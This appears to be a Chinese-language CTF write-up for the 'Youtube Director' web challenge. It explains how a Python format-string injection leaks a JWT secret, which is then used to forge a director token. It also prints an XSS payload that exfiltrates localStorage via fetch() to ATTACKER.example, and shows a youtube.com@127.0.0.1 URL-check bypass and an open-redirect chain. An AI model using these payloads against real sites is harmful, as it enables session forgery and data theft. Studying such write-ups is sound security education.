# Youtube Director

## 题目简述

应用允许用户创建 Note，只有 JWT 中 `role=director` 的用户才能让 Selenium 机器人访问报告 URL。机器人在落地页加载一秒后把 flag 写进该页面源的 `localStorage`。完整利用链为：Python `str.format` 注入泄露 JWT secret，伪造 director Token，利用 Note 模板中的属性 XSS，再绕过 YouTube URL 检查让机器人访问内部 Note，延时读取并外传 `localStorage`。

## 解题过程

### 用格式字符串泄露 JWT secret

比赛分发的 `Youtube_Director.zip` 把 `auth.py` 与 `app.py` 中的 secret 替换为 `redacted`，所以不能直接从附件读取。注册时的 `nickname` 却会拼入 `str.format` 模板：

```python
person = Greeting(selected_greeting, selected_compliment)
template = user['nickname'] + " {person.greeting}, {person.compliment}"
greeting_text = template.format(person=person)
```

Python 格式字段支持属性和字典索引访问。把昵称设为：

```text
{person.__init__.__globals__[JWT_SECRET]}
```

`Greeting.__init__` 定义在 `app.py`，它的 `__globals__` 包含 `JWT_SECRET`。登录后的问候语会把 secret 作为普通文本直接显示；当前公开部署源码中的值与页面结果一致：

```text
xDX53ndB8F
```

### 伪造 director Token

JWT 固定使用 HS256，`/report` 只检查已验证 payload 中的 `role`，不再从数据库读取角色。使用已注册的用户名签发新 Token：

```python
import time
import jwt

token = jwt.encode(
    {
        "username": "自己的注册用户名",
        "role": "director",
        "exp": int(time.time()) + 86400,
    },
    "xDX53ndB8F",
    algorithm="HS256",
)

if isinstance(token, bytes):
    token = token.decode()
print(token)
```

将其设为站点的 `token` Cookie 后，后端会允许调用报告接口。

### 创建延时属性 XSS

Note 内容被放进双引号属性，却使用 `safe`：

```html
<input type="text" value="{{ note['content'] | safe }}">
```

以 `">` 结束 `value` 属性和 `<input>`，即可插入脚本。机器人先加载 URL，等待一秒才写入 flag，又在两秒后退出，所以脚本不能立刻读取，需把执行安排在约 1.9 秒后：

```html
"><script>
setTimeout(() => {
  const flag = localStorage.getItem("flag");
  if (flag) {
    fetch(
      "https://ATTACKER.example/collect?flag=" +
      encodeURIComponent(flag)
    );
  }
}, 1900);
</script>
```

创建后记录 `/note/<id>`。该路由不要求登录，也不检查 Note 所有者，因此机器人可以直接打开。

### 绕过 YouTube URL 检查

报告接口的校验是：

```python
parsed_url = urlparse(youtube_url)
if not "youtube.com" in parsed_url.netloc and \
   not "youtu.be" in parsed_url.netloc:
    return error
```

它检查原始 `netloc` 的子串，而不是规范化后的 `hostname`。URL userinfo 语法可稳定绕过：

```text
http://youtube.com@127.0.0.1:5000/note/<id>
```

Python 对它的解释为：

```text
netloc  = youtube.com@127.0.0.1:5000
hostname = 127.0.0.1
```

所以字符串检查看到 `youtube.com` 并放行，Chromium 实际连接机器人容器内的 `127.0.0.1:5000`。这比依赖第三方跳转更短，也不会因外站修复而失效。

官方历史解法使用当时可用的 YouTube/DoubleClick 跳转链：

```text
https://youtube.com/logout?continue=http%3A%2F%2Fgoogleads.g.doubleclick.net%2Fpcs%2Fclick%3Fadurl%3D<目标URL>
```

官方保留的接收端记录显示，比赛环境中的 Linux/Chromium 机器人确实曾沿该链向攻击者控制的 webhook 地址发出 `GET` 请求，证明历史跳转可用。但截图只承载请求字段，正文已经完整记录这一事实，因此不再保留；归档复现应优先使用不依赖外站行为的 userinfo 绕过。

### 读取回传结果

机器人执行顺序为：加载 Note、等待 1 秒、为当前 Note 源设置 `localStorage.flag`、再等待 2 秒。1.9 秒的回调处于有效窗口内，接收端得到 URL 编码的：

```text
shellmates{fIxx_y0ur_0PeN_reDIrEcT$Sss}
```

如果使用 Base64 回传，也应在接收后解码；URL 编码已经足以保留 `$`、`{`、`}` 等字符。

## 方法总结

这题把四个客户端与服务端边界串在一起：格式字符串泄露签名密钥，JWT Claim 决定权限，错误的 HTML 属性上下文产生 XSS，URL 子串校验又允许机器人访问内部页面。审计 URL 时应解析并校验 `scheme`、`hostname`、端口和解析后的目标 IP，不能检查 `netloc` 子串；渲染用户内容则必须按属性上下文转义。机器人秘密写入 `localStorage` 也不会自动安全，只要攻击者能在同一源执行脚本便可读取。
